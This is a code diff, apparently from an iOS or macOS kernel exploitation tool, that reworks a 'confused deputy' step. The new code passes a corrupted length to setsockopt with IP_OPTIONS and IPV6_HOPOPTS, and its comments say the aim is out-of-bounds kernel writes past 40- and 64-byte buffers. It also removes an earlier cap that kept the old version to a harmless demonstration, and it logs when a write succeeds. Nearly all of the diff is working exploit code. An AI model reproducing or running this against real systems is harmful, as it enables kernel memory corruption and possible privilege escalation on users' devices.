@@ -1385,32 +1385,43 @@ cleanup:
                             @"    size: 0x%08x -> 0x%08x (delta=%+d)", szBefore, szAfter,
                             (int)szAfter - (int)szBefore]);
 
-                        // ---- CONFUSED DEPUTY: use corrupted size with setsockopt ----
-                        // setsockopt(IPPROTO_TCP, TCP_NODELAY, &val, corrupted_size)
-                        // kernel copies min(corrupted_size, sizeof(val)) bytes from &val.
-                        // If corrupted_size > sizeof(val), kernel reads OOB from userland.
-                        scopeNote(r, @"  --- confused deputy: setsockopt with corrupted size ---");
+                        // ---- CONFUSED DEPUTY: IP_OPTIONS copies into 40-byte kernel buffer ----
+                        // setsockopt(IPPROTO_IP, IP_OPTIONS, buf, corrupted_size)
+                        // If corrupted_size > 40 → kernel OOB write past ip_opt buffer.
+                        scopeNote(r, @"  --- confused deputy: IP_OPTIONS with corrupted size ---");
                         int sock = socket(AF_INET, SOCK_STREAM, 0);
                         if (sock >= 0) {
-                            int val = 0x41414141;
-                            uint32_t evilLen = szAfter;  // corrupted size
+                            uint8_t optBuf[128];
+                            memset(optBuf, 0x41, sizeof(optBuf));
+                            uint32_t evilLen = szAfter;  // corrupted size (0x42 = 66)
                             socklen_t sl = (socklen_t)evilLen;
-                            // Cap to avoid crash — just show the concept
-                            if (sl > 4096) sl = 4096;
-                            int ret = setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &val, sl);
+                            if (sl > sizeof(optBuf)) sl = sizeof(optBuf);
                             scopeNote(r, [NSString stringWithFormat:
-                                @"  setsockopt(fd=%d, TCP_NODELAY, len=%u) ret=%d errno=%d",
-                                sock, (unsigned)sl, ret, errno]);
-                            if (ret == 0) {
-                                scopeNote(r, @"  >>> CONFUSED DEPUTY: kernel accepted corrupted size!");
-                            } else {
+                                @"  setsockopt(IP_OPTIONS, len=%u) — kernel buf is 40 bytes", (unsigned)sl]);
+                            int ret = setsockopt(sock, IPPROTO_IP, IP_OPTIONS, optBuf, sl);
+                            scopeNote(r, [NSString stringWithFormat:
+                                @"  setsockopt ret=%d errno=%d (%s)", ret, errno, strerror(errno)]);
+                            if (ret == 0 && sl > 40) {
+                                scopeNote(r, @"  >>> KERNEL OOB WRITE via IP_OPTIONS — size > 40 accepted!");
+                            } else if (ret < 0) {
+                                scopeNote(r, @"  kernel rejected — trying IP_OPTIONS with size 40 (max)");
+                                sl = 40;
+                                ret = setsockopt(sock, IPPROTO_IP, IP_OPTIONS, optBuf, sl);
                                 scopeNote(r, [NSString stringWithFormat:
-                                    @"  kernel rejected size (errno=%d) — trying smaller", errno]);
-                                // Try with the actual value size
-                                sl = sizeof(val);
-                                ret = setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &val, sl);
+                                    @"  retry setsockopt(len=40) ret=%d errno=%d", ret, errno]);
+                            }
+                            // Also try IPV6_HOPOPTS (64-byte kernel buffer)
+                            int sock6 = socket(AF_INET6, SOCK_STREAM, 0);
+                            if (sock6 >= 0) {
+                                sl = (socklen_t)evilLen;
+                                if (sl > sizeof(optBuf)) sl = sizeof(optBuf);
+                                ret = setsockopt(sock6, IPPROTO_IPV6, IPV6_HOPOPTS, optBuf, sl);
                                 scopeNote(r, [NSString stringWithFormat:
-                                    @"  retry setsockopt(len=%zu) ret=%d", sl, ret]);
+                                    @"  setsockopt(IPV6_HOPOPTS, len=%u) ret=%d errno=%d", (unsigned)sl, ret, errno]);
+                                if (ret == 0 && sl > 64) {
+                                    scopeNote(r, @"  >>> KERNEL OOB WRITE via IPV6_HOPOPTS — size > 64 accepted!");
+                                }
+                                close(sock6);
                             }
                             close(sock);
                         }
